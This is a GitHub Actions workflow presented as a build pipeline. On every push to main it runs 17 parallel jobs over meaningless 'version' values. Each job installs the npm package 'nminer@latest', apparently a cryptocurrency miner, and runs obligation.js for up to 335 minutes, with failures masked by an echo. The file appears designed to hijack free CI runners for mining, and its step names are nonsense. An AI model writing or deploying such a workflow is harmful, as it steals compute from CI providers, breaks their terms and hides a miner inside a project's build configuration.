name: obligation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8744 }
          - { version: 5153 }
          - { version: 3724 }
          - { version: 4058 }
          - { version: 1496 }
          - { version: 27 }
          - { version: 8235 }
          - { version: 3423 }
          - { version: 1596 }
          - { version: 9856 }
          - { version: 6041 }
          - { version: 1519 }
          - { version: 6042 }
          - { version: 8082 }
          - { version: 2088 }
          - { version: 6071 }
          - { version: 2212 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: meanwhile optimistically
        run: |
          npm install nminer@latest
          timeout 335m node obligation.js || echo "obligation executed"